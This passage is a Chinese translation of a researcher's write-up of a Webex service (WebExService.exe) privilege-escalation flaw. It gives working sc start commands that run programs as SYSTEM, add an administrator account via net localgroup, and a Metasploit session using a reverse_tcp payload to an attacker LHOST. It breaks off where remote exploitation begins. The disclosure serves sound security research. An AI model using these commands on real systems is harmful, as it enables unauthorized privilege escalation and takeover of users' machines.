      .text:00402818                 push    eax
      .text:00402819                 push    ecx
      .text:0040281A                 lea     ecx, [edi-3]
      .text:0040281D                 call    sub_4025A0
字符串software-update是用来比较字符串的。因此，让我们尝试 software-update，而不是b，看看这会不会让我们走得更远!我想再次指出的是，我们在组装层只做了绝对最少的反向工程——我们基本上完全使用API调用和错误消息!
这是我们的新命令：
    C:\Users\ron>sc start webexservice a software-update
    [...]
这是新的日志条目:
    Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Faulting module name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Exception code: 0xc0000005
      Fault offset: 0x00002643
      Faulting process id: 0x654
      Faulting application start time: 0x01d42dbbf2bcc9b8
      Faulting application path: C:\ProgramData\Webex\Webex\Applications\WebExService.exe
      Faulting module path: C:\ProgramData\Webex\Webex\Applications\WebExService.exe
      Report Id: 31555e60-99af-11e8-8391-0800271677bd
哦哦!当我得到一个崩溃的进程时，我通常很兴奋，但这次我实际上是在尝试使用它的特性!我们该怎么办!?
首先，我们可以看看异常代码:0xc0000005。如果你放弃了它，或者开发了低级别的软件，你就会知道这是一个内存错误。进程试图访问一个坏内存地址(可能为空，但我从未验证过)。
我尝试的第一件事是暴力的方法:让我们添加更多命令行参数!我的逻辑是，它可能需要两个参数，但实际上使用第三个参数，当它们不存在时，就会崩溃。
所以我使用以下命令行启动了该服务：
    C:\Users\ron>sc start webexservice a software-update a b c d e f
    [...]
这导致了新的崩溃，因此更进了一步!
    Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Faulting module name: MSVCR120.dll, version: 12.0.21005.1, time stamp: 0x524f7ce6
      Exception code: 0x40000015
      Fault offset: 0x000a7676
      Faulting process id: 0x774
      Faulting application start time: 0x01d42dbc22eef30e
      Faulting application path: C:\ProgramData\Webex\Webex\Applications\WebExService.exe
      Faulting module path: C:\ProgramData\Webex\Webex\Applications\MSVCR120.dll
      Report Id: 60a0439c-99af-11e8-8391-0800271677bd
我需要谷歌0x40000015;这意味着STATUS_FATAL_APP_EXIT。换句话说，应用程序退出了，但是很难——可能是一个失败的assert()?我们实际上没有任何产出，所以很难说。
这个花了我一段时间，这就是我将跳过无用端和调试的地方，并向您展示什么是有效的。
基本上，在我们前面看到的software-update之后，继续跟踪代码开发者。不久之后，您将看到这个函数调用:
    .text:0040281D                 call    sub_4025A0
如果你跳进那个函数(双击)，向下滚动一点，你将会看到:
    .text:00402616                 mov     [esp+0B4h+var_70], offset aWinsta0Default ; "winsta0\\Default"
我在这里使用了最先进的技术并用Google搜索了那个字符串。事实证明，它是默认桌面的句柄，并且在启动需要与用户交互的新流程时经常使用。这是一个很好的迹象，这意味着我们几乎就要成功了！
稍后，在同一个函数中，我们看到这段代码：
    .text:004026A2                 push    eax             ; EndPtr
      .text:004026A3                 push    esi             ; Str
      .text:004026A4                 call    ds:wcstod ;  sc start webexservice a software-update 1  2  3  4  5  6
并检查了事件日志：
    StartUpdateProcess::CreateProcessAsUser:1;1;2 3 4 5 6(18).
这看起来很有希望！我将2更改为实际的进程：
    C：\ Users \ ron> sc start webexservice a software-update 1 calc cdef
它打开了！
    C:\Users\ron>tasklist | find "calc"
    calc.exe                      1476 Console                    1     10,804 K
它实际上也是使用GUI运行的，所以这是不必要的。我真的能看到!它以系统的方式运行!
说到未知数，以相同的方式运行cmd.exe和powershell似乎不起作用。但是，我们可以运行wmic.exe和net.exe，所以我们还有其他的选择！
# 本地利用
最简单的漏洞是使用wmic.exe启动cmd.exe：
    C:\Users\ron>sc start webexservice a software-update 1 wmic process call create "cmd.exe"
这将打开一个GUI cmd.exe实例作为SYSTEM：
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    C:\Windows\system32>whoami
    nt authority\system
如果我们不能或不选择打开GUI，我们也可以提升权限：
    C:\Users\ron>net localgroup administrators
    [...]
    Administrator
    ron
    C:\Users\ron>sc start webexservice a software-update 1 net localgroup administrators testuser /add
    [...]
    C:\Users\ron>net localgroup administrators
    [...]
    Administrator
    ron
    testuser
这一切工作作为一个非特权用户!
Jeff为Metasploit编写了一个[本地模块](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/exploits/windows/local/webexec.rb)来利用特权升级漏洞。如果您在受影响的计算机上有一个非system会话，您可以使用它获得一个system账户:
    meterpreter > getuid
    Server username: IEWIN7\IEUser
    meterpreter > background
    [*] Backgrounding session 2...
    msf exploit(multi/handler) > use exploit/windows/local/webexec
    msf exploit(windows/local/webexec) > set SESSION 2
    SESSION => 2
    msf exploit(windows/local/webexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(windows/local/webexec) > set LHOST 172.16.222.1
    msf exploit(windows/local/webexec) > set LPORT 9001
    msf exploit(windows/local/webexec) > run
    [*] Started reverse TCP handler on 172.16.222.1:9001
    [*] Checking service exists...
    [*] Writing 73802 bytes to %SystemRoot%\Temp\yqaKLvdn.exe...
    [*] Launching service...
    [*] Sending stage (179779 bytes) to 172.16.222.132
    [*] Meterpreter session 2 opened (172.16.222.1:9001 -> 172.16.222.132:49574) at 2018-08-31 14:45:25 -0700
    [*] Service started...
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
# 远程利用
实际上，我们花了一周多的时间了解这个漏洞，却没有意识到它可以远程使用!使用Windows
sc命令仍然可以完成最简单的攻击。创建远程机器的会话或创建具有相同凭证的本地用户，然后运行cmd.exe在该用户的上下文中(runas
/user:newuser cmd.exe)。一旦完成，您可以对远程主机使用完全相同的命令: